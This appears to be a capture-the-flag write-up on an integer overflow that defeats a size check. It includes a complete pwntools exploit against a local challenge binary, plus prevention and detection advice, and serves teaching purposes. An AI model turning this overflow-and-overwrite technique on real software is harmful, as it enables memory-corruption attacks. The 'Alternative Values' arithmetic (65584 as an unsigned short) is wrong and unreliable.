# Challenge 13: Integer Overflow

## Difficulty: Easy-Medium

## Vulnerability Type: Integer Overflow

## Description
The program tries to validate input size, but an integer overflow in the safety check allows bypassing the validation.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerability Analysis

### The Bug
```c
unsigned short size;  // Max value: 65535
unsigned short total = size + 16;  // Can overflow!

if (total <= sizeof(buffer)) {  // Check uses overflowed value
    read(0, buffer, size);       // But read uses original size!
}
```

### Integer Overflow Math
```
unsigned short max = 65535
If size = 65520:
  total = 65520 + 16 = 65536
  But unsigned short wraps: 65536 % 65536 = 0
  So total = 0!

Check: if (0 <= 64) -> TRUE ✓
Read: read(0, buffer, 65520) -> Massive overflow!
```

## Exploitation Strategy

### Step 1: Calculate Overflow Value
We want: `(size + 16) mod 65536 <= 64`

If we set `size = 65520`:
- `total = 65520 + 16 = 65536 = 0` (wraps to 0)
- `0 <= 64` -> Check passes
- `read(0, buffer, 65520)` -> Buffer overflow!

### Step 2: Overflow to Win
```python
size = 65520  # Causes overflow to 0
# This bypasses the check
# Then we can overflow buffer with standard ROP
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9013)
else:
    p = process('./challenge')

# Get win address
win_addr = elf.symbols['win']
log.info(f"win(): {hex(win_addr)}")

# Integer overflow value
# We want (size + 16) to wrap around
# unsigned short max = 65535
# size = 65536 - 16 = 65520
# total = 65520 + 16 = 65536 = 0 (wraps)

overflow_size = 65536 - 16  # = 65520

p.sendlineafter(b'read? ', str(overflow_size).encode())

# Now we can overflow the buffer
offset = 72  # 64 byte buffer + 8 byte RBP

payload = b'A' * offset
payload += p64(win_addr)

p.sendafter(b'data: ', payload)
p.interactive()
```

### Alternative Values
Any value where `(size + 16) mod 65536 <= 64` works:
- `size = 65520`: `total = 0`
- `size = 65521`: `total = 1`
- ...
- `size = 65535 + 49 = 65584 = 48` (wraps to 48)

## Automated Detection
- **Unsigned Integer Types**: Use of unsigned short/char
- **Arithmetic Before Check**: Addition/multiplication before bounds check
- **Inconsistent Use**: Different variables used for check vs actual operation
- **Pattern**: `if (user_input + offset < limit)` with small integer type
- **Strategy**: Calculate overflow value, then standard buffer overflow

## Integer Overflow Classes

### Overflow
```c
unsigned short x = 65535;
x = x + 1;  // x = 0 (wraps)
```

### Underflow
```c
unsigned int x = 0;
x = x - 1;  // x = 4294967295 (wraps)
```

### Signedness
```c
int size = -1;
if (size < MAX) {  // -1 < 100 -> TRUE
    memcpy(buf, src, size);  // Interprets -1 as 4294967295!
}
```

## Real-World Examples
- CVE-2002-0391: Apache chunked encoding
- CVE-2004-0492: ProFTPD
- CVE-2009-1385: Linux kernel e1000
- Many more in memory allocation: `malloc(count * size)`

## Prevention
```c
// Check for overflow BEFORE operation
if (size > USHRT_MAX - 16) {
    return -1;  // Would overflow
}
unsigned short total = size + 16;
```

Or use larger types:
```c
unsigned int size;  // Harder to overflow
```

Or use safe math libraries (e.g., `__builtin_add_overflow` in GCC).

## Learning Objectives
- Integer overflow mechanics
- Wraparound behavior
- Type size limitations
- Validation bypass techniques
- Difference between logical bug and memory corruption

## Detection Tools
- Static analysis: Coverity, CodeQL
- Fuzzing: AFL++, libFuzzer with sanitizers
- Runtime: UndefinedBehaviorSanitizer (UBSan)
